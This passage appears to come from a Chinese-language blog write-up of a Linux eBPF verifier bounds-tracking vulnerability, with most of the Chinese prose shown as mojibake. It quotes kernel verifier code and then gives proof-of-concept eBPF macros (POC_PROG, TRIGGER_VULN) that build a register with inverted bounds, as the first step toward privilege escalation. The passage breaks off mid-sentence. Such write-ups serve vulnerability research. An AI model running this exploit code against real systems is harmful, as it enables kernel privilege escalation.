class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">default</span>:<br>mark_reg_unknown(env, regs, insn-&gt;dst_reg);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-comment">/* ALU32 ops are zero extended into 64bit register */</span><br><span class="hljs-keyword">if</span> (alu32)<br>zext_32_to_64(dst_reg);<br><br>__update_reg_bounds(dst_reg);<br>__reg_deduce_bounds(dst_reg);<br>__reg_bound_offset(dst_reg);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>__reg_deduce_bounds()</code> ä¸»è¦å†åšä¸€æ¬¡è¾¹ç•Œè°ƒæ•´æ ¡éªŒçš„å·¥ä½œï¼Œè¿™é‡Œ 32 ä½ä¸ 64 ä½éƒ½ç”¨çš„åŒä¸€å¥—é€»è¾‘ï¼š</p><ul><li>è‹¥æœ‰ç¬¦å·æœ€å°å€¼è¾¹ç•Œå¤§äºç­‰äº 0 æˆ– æœ‰ç¬¦å·æœ€å¤§å€¼è¾¹ç•Œå°äº 0 ï¼Œåˆ™æ›´æ–°æœ‰ç¬¦å·æœ€å°å€¼è¾¹ç•Œä¸ºæœ‰ç¬¦å·ä¸æ— ç¬¦å·æœ€å°å€¼è¾¹ç•Œä¸­çš„æœ€å¤§å€¼ï¼Œå¹¶æ›´æ–°æœ‰ç¬¦å·æœ€å¤§å€¼è¾¹ç•Œä¸ºæœ‰ç¬¦å·ä¸æ— ç¬¦å·æœ€å¤§å€¼è¾¹ç•Œä¸­çš„æœ€å°å€¼ï¼Œä¹‹åç›´æ¥è¿”å›</li><li>è‹¥æ— ç¬¦å·æœ€å¤§å€¼è¾¹ç•Œæ²¡æœ‰è¶…è¿‡æœ‰ç¬¦å·èŒƒå›´ï¼ˆæœ€é«˜ä½ä¸ä¸º1ï¼‰ï¼Œåˆ™å°†æœ‰ç¬¦å·æœ€å°å€¼è®¾ä¸ºæ— ç¬¦å·æœ€å°å€¼ï¼Œæœ‰ç¬¦å·æœ€å¤§å€¼è®¾ä¸ºæœ‰ç¬¦å·ä¸æ— ç¬¦å·æœ€å¤§å€¼ä¸­çš„æœ€å°å€¼</li><li>å¦åˆ™ï¼Œè‹¥æ— ç¬¦å·æœ€å°å€¼è¾¹ç•Œè¶…è¿‡æœ‰ç¬¦å·èŒƒå›´ï¼ˆæœ€é«˜ä½ä¸º1ï¼‰ï¼Œåˆ™å°†æœ‰ç¬¦å·æœ€å°å€¼è®¾ä¸ºæœ‰ç¬¦å·ä¸æ— ç¬¦å·æœ€å°å€¼ä¸­çš„æœ€å¤§å€¼ï¼Œå°†æœ‰ç¬¦å·æœ€å¤§å€¼è®¾ä¸ºæ— ç¬¦å·æœ€å¤§å€¼</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* ä½¿ç”¨æœ‰ç¬¦å·çš„æœ€å°/æœ€å¤§å€¼èµ‹å€¼æ— ç¬¦å·, åä¹‹äº¦ç„¶ */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __reg32_deduce_bounds(<span class="hljs-keyword">struct</span> bpf_reg_state *reg)<br>&#123;<br><span class="hljs-comment">/* ä»æœ‰ç¬¦å·è¾¹ç•Œä¸­è·å–ç¬¦å·.</span><br><span class="hljs-comment"> * è‹¥æˆ‘ä»¬æ— æ³•ç©¿è¿‡ç¬¦å·è¾¹ç•Œï¼Œæœ‰ç¬¦å·ä¸æ— ç¬¦å·è¾¹ç•Œç›¸åŒï¼Œæ•…åˆå¹¶.</span><br><span class="hljs-comment"> * è¿™åœ¨è´Ÿæ•°æƒ…å†µä¸‹ä¹Ÿæœ‰ç”¨ï¼Œä¾‹å¦‚ï¼š</span><br><span class="hljs-comment"> * -3 s&lt;= x s&lt;= -1 æ„å‘³ç€ 0xf...fd u&lt;= x u&lt;= 0xf...ff.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (reg-&gt;s32_min_value &gt;= <span class="hljs-number">0</span> || reg-&gt;s32_max_value &lt; <span class="hljs-number">0</span>) &#123;<br>reg-&gt;s32_min_value = reg-&gt;u32_min_value =<br><span class="hljs-type">max_t</span>(u32, reg-&gt;s32_min_value, reg-&gt;u32_min_value);<br>reg-&gt;s32_max_value = reg-&gt;u32_max_value =<br><span class="hljs-type">min_t</span>(u32, reg-&gt;s32_max_value, reg-&gt;u32_max_value);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-comment">/* ä»æ— ç¬¦å·è¾¹ç•Œä¸­è·å–è¾¹ç•Œ.  </span><br><span class="hljs-comment"> * æœ‰ç¬¦å·è¾¹ç•Œç©¿è¿‡äº†æœ‰ç¬¦å·èŒƒå›´ï¼Œæˆ‘ä»¬å¿…é¡»å°å¿ƒ.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> ((s32)reg-&gt;u32_max_value &gt;= <span class="hljs-number">0</span>) &#123;<br><span class="hljs-comment">/* æ­£æ•°. æˆ‘ä»¬æ— æ³•ä» smin è·å–ä»»ä½•ä¸œè¥¿, </span><br><span class="hljs-comment"> * ä½† smax æ˜¯æ­£æ•°ï¼Œå› æ­¤æ˜¯å®‰å…¨çš„.</span><br><span class="hljs-comment"> */</span><br>reg-&gt;s32_min_value = reg-&gt;u32_min_value;<br>reg-&gt;s32_max_value = reg-&gt;u32_max_value =<br><span class="hljs-type">min_t</span>(u32, reg-&gt;s32_max_value, reg-&gt;u32_max_value);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((s32)reg-&gt;u32_min_value &lt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-comment">/* è´Ÿæ•°.  æˆ‘ä»¬æ— æ³•ä» smax è·å–ä»»ä½•ä¸œè¥¿,</span><br><span class="hljs-comment"> * ä½† smin æ˜¯è´Ÿæ•°ï¼Œå› æ­¤æ˜¯å®‰å…¨çš„.</span><br><span class="hljs-comment"> */</span><br>reg-&gt;s32_min_value = reg-&gt;u32_min_value =<br><span class="hljs-type">max_t</span>(u32, reg-&gt;s32_min_value, reg-&gt;u32_min_value);<br>reg-&gt;s32_max_value = reg-&gt;u32_max_value;<br>&#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __reg64_deduce_bounds(<span class="hljs-keyword">struct</span> bpf_reg_state *reg)<br>&#123;<br><span class="hljs-comment">/* Learn sign from signed bounds.</span><br><span class="hljs-comment"> * If we cannot cross the sign boundary, then signed and unsigned bounds</span><br><span class="hljs-comment"> * are the same, so combine.  This works even in the negative case, e.g.</span><br><span class="hljs-comment"> * -3 s&lt;= x s&lt;= -1 implies 0xf...fd u&lt;= x u&lt;= 0xf...ff.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (reg-&gt;smin_value &gt;= <span class="hljs-number">0</span> || reg-&gt;smax_value &lt; <span class="hljs-number">0</span>) &#123;<br>reg-&gt;smin_value = reg-&gt;umin_value = <span class="hljs-type">max_t</span>(u64, reg-&gt;smin_value,<br>  reg-&gt;umin_value);<br>reg-&gt;smax_value = reg-&gt;umax_value = <span class="hljs-type">min_t</span>(u64, reg-&gt;smax_value,<br>  reg-&gt;umax_value);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-comment">/* Learn sign from unsigned bounds.  Signed bounds cross the sign</span><br><span class="hljs-comment"> * boundary, so we must be careful.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> ((s64)reg-&gt;umax_value &gt;= <span class="hljs-number">0</span>) &#123;<br><span class="hljs-comment">/* Positive.  We can&#x27;t learn anything from the smin, but smax</span><br><span class="hljs-comment"> * is positive, hence safe.</span><br><span class="hljs-comment"> */</span><br>reg-&gt;smin_value = reg-&gt;umin_value;<br>reg-&gt;smax_value = reg-&gt;umax_value = <span class="hljs-type">min_t</span>(u64, reg-&gt;smax_value,<br>  reg-&gt;umax_value);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((s64)reg-&gt;umin_value &lt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-comment">/* Negative.  We can&#x27;t learn anything from the smax, but smin</span><br><span class="hljs-comment"> * is negative, hence safe.</span><br><span class="hljs-comment"> */</span><br>reg-&gt;smin_value = reg-&gt;umin_value = <span class="hljs-type">max_t</span>(u64, reg-&gt;smin_value,<br>  reg-&gt;umin_value);<br>reg-&gt;smax_value = reg-&gt;umax_value;<br>&#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __reg_deduce_bounds(<span class="hljs-keyword">struct</span> bpf_reg_state *reg)<br>&#123;<br>__reg32_deduce_bounds(reg);<br>__reg64_deduce_bounds(reg);<br>&#125;<br><br></code></pre></td></tr></table></figure><p> <code>__reg_bound_offset()</code> åˆ™æ˜¯åŸºäºè¾¹ç•Œå€¼èŒƒå›´é‡æ–°è®¡ç®— <code>var_off</code> çš„å€¼ï¼š</p><ul><li><code>tnum_range()</code>ï¼šå– min ä¸­ minã€max çš„ä½ä½ç›¸åŒä½éƒ¨åˆ†ï¼Œä»ç¬¬ä¸€ä¸ªä¸åŒä½å¼€å§‹è®¾ä¸ºæœªçŸ¥</li><li><code>tnum_intersect()</code>ï¼šå– aã€b çš„å…±æœ‰å·²çŸ¥ä¸º 1 çš„ä½</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> tnum <span class="hljs-title function_">tnum_range</span><span class="hljs-params">(u64 min, u64 max)</span><br>&#123;<br>u64 chi = min ^ max, delta;<br>u8 bits = fls64(chi); <span class="hljs-comment">// æ‰¾åˆ°ä¸º 1 çš„æœ€ä½ä½</span><br><br><span class="hljs-comment">/* ç‰¹æ®Šæƒ…å†µï¼Œ éœ€è¦è¿™æ ·å› ä¸º 1ULL &lt;&lt; 64 æ˜¯æœªå®šä¹‰çš„ */</span><br><span class="hljs-keyword">if</span> (bits &gt; <span class="hljs-number">63</span>)<br><span class="hljs-keyword">return</span> tnum_unknown;<br><span class="hljs-comment">/* ä¾‹å¦‚è‹¥ chi = 4, bits = 3, delta = (1&lt;&lt;3) - 1 = 7.</span><br><span class="hljs-comment"> * è‹¥ chi = 0, bits = 0, delta = (1&lt;&lt;0) - 1 = 0, </span><br><span class="hljs-comment"> *  æ•…æˆ‘ä»¬è¿”å›å¸¸æ•° min (å› ä¸º min == max).</span><br><span class="hljs-comment"> */</span><br>delta = (<span class="hljs-number">1ULL</span> &lt;&lt; bits) - <span class="hljs-number">1</span>;<br><span class="hljs-keyword">return</span> TNUM(min &amp; ~delta, delta);<br>&#125;<br><br><span class="hljs-comment">/* éœ€è¦æ³¨æ„çš„æ˜¯è‹¥ a ä¸ b ä¸åŒæ„ - å³å…¶ä¸€æœ‰ä¸€ä¸ª &#x27;known 1&#x27; è€Œå¦ä¸€ä¸ªåˆ™</span><br><span class="hljs-comment"> * æœ‰ä¸€ä¸ª &#x27;known 0&#x27; - è¿™å°†ä¸ºè¯¥ä½è¿”å›ä¸€ä¸ª &#x27;known 1&#x27;.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">struct</span> tnum <span class="hljs-title function_">tnum_intersect</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> tnum a, <span class="hljs-keyword">struct</span> tnum b)</span><br>&#123;<br>u64 v, mu;<br><br>v = a.value | b.value;<br>mu = a.mask &amp; b.mask;<br><span class="hljs-keyword">return</span> TNUM(v &amp; ~mu, mu);<br>&#125;<br><br><span class="hljs-comment">/* å°è¯•åŸºäºæ— ç¬¦å·æœ€å°/æœ€å¤§å€¼æ”¹è¿› var_off ä¿¡æ¯ */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __reg_bound_offset(<span class="hljs-keyword">struct</span> bpf_reg_state *reg)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tnum</span> <span class="hljs-title">var64_off</span> =</span> tnum_intersect(reg-&gt;var_off,<br>       tnum_range(reg-&gt;umin_value,<br>  reg-&gt;umax_value));<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tnum</span> <span class="hljs-title">var32_off</span> =</span> tnum_intersect(tnum_subreg(reg-&gt;var_off),<br>tnum_range(reg-&gt;u32_min_value,<br>   reg-&gt;u32_max_value));<br><br>reg-&gt;var_off = tnum_or(tnum_clear_subreg(var64_off), var32_off);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸¤ä¸ªæ“ä½œåœ¨è¿™é‡Œéƒ½ä¸ä¼šå½±å“ R2 çš„å€¼</p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p>ç°åœ¨æˆ‘ä»¬æ¥æ„é€ èƒ½å¤Ÿè§¦å‘è¯¥æ¼æ´çš„ä¸¤ä¸ªå¯„å­˜å™¨ <code>R2 = &#123; .value = 1, mask = 0xffffffff00000000 &#125;</code> ä¸ <code>R3 = &#123; .value = 0x100000002, mask = 0 &#125;</code>ï¼Œå…¶ä¸­ <code>R3</code> å¯ä»¥ç›´æ¥é€šè¿‡èµ‹å€¼æ„é€ ä¸€ä¸ª known çš„å¯„å­˜å™¨ï¼Œ <code>R2</code> éœ€è¦ä¸€åŠå·²çŸ¥ä¸€åŠæœªçŸ¥ï¼Œå¯ä»¥é€šè¿‡ <em>ä» map ä¸­å–å‡ºä¸€ä¸ªå€¼è¿›è¡Œèµ‹å€¼</em> çš„æ–¹å¼å…ˆæ„é€ å‡ºä¸€ä¸ª unknown çš„å¯„å­˜å™¨ï¼Œå†ä¸ <code>0xffffffff00000000</code> åš AND æ“ä½œä½¿å…¶ä½ 32 ä½å˜ä¸º knownï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> POC_PROG(__map_fd)                              \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* Load value from map */</span>                       \</span><br><span class="hljs-meta">        BPF_LD_MAP_FD(BPF_REG_9, __map_fd),             \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),            \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),           \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),          \</span><br><span class="hljs-meta">        BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 0),            \</span><br><span class="hljs-meta">        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* if success, r0 will be ptr to value, 0 for failed */</span>              \</span><br><span class="hljs-meta">        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),          \</span><br><span class="hljs-meta">        BPF_EXIT_INSN(),                                \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* load value into r2, make it part-unknown */</span>  \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_0, 0),   \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_4, 0xffffffff),           \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_4, 32),          \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_AND, BPF_REG_2, BPF_REG_4),   \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, 0x1),         \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* r3 = 0x100000002 */</span>                          \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_3, 0x1),                  \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_3, 32),          \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, 0x2),         \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* triger the vulnerability */</span>                  \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_AND, BPF_REG_2, BPF_REG_3)</span><br></code></pre></td></tr></table></figure><p>æŠŠè¿™ä¸ªç¨‹åºè½½å…¥å†…æ ¸è¿‡ä¸€é verifierï¼Œç®€å•æ‰“å°ä¸‹æ—¥å¿—ï¼Œå¯ä»¥çœ‹åˆ°<strong>æˆ‘ä»¬ç¡®ä¹æ„é€ å‡ºäº†ä¸€ä¸ªæœ€å°è¾¹ç•Œå€¼ä¸º 1ã€æœ€å¤§è¾¹ç•Œå€¼ä¸º 0 çš„å¯„å­˜å™¨</strong>ï¼š</p><p><img src="https://s2.loli.net/2023/06/02/br1XJgjKeFR6pOq.png" alt="æµ‹è¯• poc"></p><h1 id="0x02-æ¼æ´åˆ©ç”¨"><a href="#0x02-æ¼æ´åˆ©ç”¨" class="headerlink" title="0x02. æ¼æ´åˆ©ç”¨"></a>0x02. æ¼æ´åˆ©ç”¨</h1><p>æ¥ä¸‹æ¥æˆ‘ä»¬è€ƒè™‘å¦‚ä½•åˆ©ç”¨è¿™ä¸ªæ¼æ´å®Œæˆææƒï¼Œç°åœ¨æˆ‘ä»¬æœ‰äº†ä¸€ä¸ª 32 ä½è¾¹ç•Œå€¼ä¸º <code>[1ï¼Œ0]</code> ã€32ä½æ¨æµ‹å€¼ä¸32ä½è¿è¡Œæ—¶å€¼éƒ½ä¸º 0 çš„å¯„å­˜å™¨ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬è€ƒè™‘å¦‚ä½•æ„é€ ä¸€ä¸ª<strong>verifier æ¨æµ‹å€¼ä¸è¿è¡Œæ—¶å€¼ä¸åŒçš„å¯„å­˜å™¨</strong>ï¼Œä»è€Œç»§ç»­å®Œæˆåç»­åˆ©ç”¨</p><h2 id="ä¸€ã€æ„é€ è¾¹ç•Œå€¼ä¸º-1-0-çš„å¯„å­˜å™¨"><a href="#ä¸€ã€æ„é€ è¾¹ç•Œå€¼ä¸º-1-0-çš„å¯„å­˜å™¨" class="headerlink" title="ä¸€ã€æ„é€ è¾¹ç•Œå€¼ä¸º [1, 0] çš„å¯„å­˜å™¨"></a>ä¸€ã€æ„é€ è¾¹ç•Œå€¼ä¸º [1, 0] çš„å¯„å­˜å™¨</h2><p><strong>ç¬¬ä¸€æ­¥è¿˜æ˜¯å…ˆåˆ©ç”¨æ¼æ´æ„é€ ä¸€ä¸ªæœ€å°è¾¹ç•Œå€¼ä¸º 1ã€æœ€å¤§è¾¹ç•Œå€¼ä¸º 0 çš„å¯„å­˜å™¨</strong>ï¼Œå› ä¸º R1~R5 æœ‰çš„æ—¶å€™è¦ç”¨æ¥ä½œä¸ºå‡½æ•°å‚æ•°ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬æ”¹ä¸ºåœ¨ <code>R6</code> ä¸Šç»§ç»­æ„é€ </p><p>å› ä¸ºè¯»å– map çš„æ“ä½œä»£ç è¡Œæ•°å¤ªé•¿äº†ï¼ˆï¼‰ï¼Œæ‰€ä»¥ç¬”è€…ç°åœ¨ç»™ä»–å°è£…åˆ°ä¸€ä¸ª <code>BPF_READ_ARRAY_MAP_IDX()</code> å®é‡Œï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> VULN_REG BPF_REG_6</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_READ_ARRAY_MAP_IDX(__idx, __map_fd, __dst_reg)                   \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* get a pointer to bpf_array */</span>                \</span><br><span class="hljs-meta">        BPF_LD_MAP_FD(BPF_REG_9, __map_fd),             \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),            \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),           \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),          \</span><br><span class="hljs-meta">        BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, __idx),        \</span><br><span class="hljs-meta">        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* if success, r0 will be ptr to value, 0 for failed */</span>              \</span><br><span class="hljs-meta">        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),          \</span><br><span class="hljs-meta">        BPF_EXIT_INSN(),                                \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* mov the result back and clear R0 */</span>          \</span><br><span class="hljs-meta">        BPF_MOV64_REG(__dst_reg, BPF_REG_0),            \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_0, 0)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TRIGGER_VULN(__map_fd)                          \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* load value into r2, make it part-unknown */</span>  \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_8), \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, VULN_REG, BPF_REG_8, 0),    \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_4, 0xffffffff),           \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_4, 32),          \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_AND, VULN_REG, BPF_REG_4),    \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, VULN_REG, 0x1),          \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* r3 = 0x100000002 */</span>                          \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_3, 0x1),                  \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_3, 32),          \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, 0x2),         \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* triger the vulnerability */</span>                  \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_AND, VULN_REG, BPF_REG_3)</span><br></code></pre></td></tr></table></figure><h2 id="äºŒã€æ„é€ è¿è¡Œæ—¶ä¸º-1ã€verifier-ç¡®ä¿¡ä¸º-0-çš„å¯„å­˜å™¨"><a href="#äºŒã€æ„é€ è¿è¡Œæ—¶ä¸º-1ã€verifier-ç¡®ä¿¡ä¸º-0-çš„å¯„å­˜å™¨" class="headerlink" title="äºŒã€æ„é€ è¿è¡Œæ—¶ä¸º 1ã€verifier ç¡®ä¿¡ä¸º 0 çš„å¯„å­˜å™¨"></a>äºŒã€æ„é€ è¿è¡Œæ—¶ä¸º 1ã€verifier ç¡®ä¿¡ä¸º 0 çš„å¯„å­˜å™¨</h2><p>æˆ‘ä»¬è¿˜æ˜¯è€ƒè™‘ç»§ç»­åœ¨ 32 ä½ä¸Šåšæ–‡ç« ï¼Œå‡å¦‚æˆ‘ä»¬æ„é€ å‡ºå¦ä¸€ä¸ª 32 ä½è¾¹ç•Œå€¼ä¸º <code>[0, 1]</code> ã€32ä½è¿è¡Œæ—¶å€¼ä¸º <code>0</code> å¯„å­˜å™¨ <code>R7</code>ï¼Œå°†è¿™ä¸ªå¯„å­˜å™¨ä¸æˆ‘ä»¬çš„ <code>R6</code> ç›¸åŠ ï¼Œå…¶è¾¹ç•Œå€¼è®¡ç®—å…¶å®å°±æ˜¯æ£€æŸ¥æ˜¯å¦æœ‰æº¢å‡ºç„¶åç®€å•çš„æŠŠä¸¤ä¸ªå¯„å­˜å™¨è¾¹ç•Œç›¸åŠ ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">scalar32_min_max_add</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_reg_state *dst_reg,</span><br><span class="hljs-params"> <span class="hljs-keyword">struct</span> bpf_reg_state *src_reg)</span><br>&#123;<br>s32 smin_val = src_reg-&gt;s32_min_value;<br>s32 smax_val = src_reg-&gt;s32_max_value;<br>u32 umin_val = src_reg-&gt;u32_min_value;<br>u32 umax_val = src_reg-&gt;u32_max_value;<br><br><span class="hljs-keyword">if</span> (signed_add32_overflows(dst_reg-&gt;s32_min_value, smin_val) ||<br>    signed_add32_overflows(dst_reg-&gt;s32_max_value, smax_val)) &#123;<br>dst_reg-&gt;s32_min_value = S32_MIN;<br>dst_reg-&gt;s32_max_value = S32_MAX;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>dst_reg-&gt;s32_min_value += smin_val;<br>dst_reg-&gt;s32_max_value += smax_val;<br>&#125;<br><span class="hljs-keyword">if</span> (dst_reg-&gt;u32_min_value + umin_val &lt; umin_val ||<br>    dst_reg-&gt;u32_max_value + umax_val &lt; umax_val) &#123;<br>dst_reg-&gt;u32_min_value = <span class="hljs-number">0</span>;<br>dst_reg-&gt;u32_max_value = U32_MAX;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>dst_reg-&gt;u32_min_value += umin_val;<br>dst_reg-&gt;u32_max_value += umax_val;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ­¤æ—¶æˆ‘ä»¬çš„å¯„å­˜å™¨ <code>R6</code> 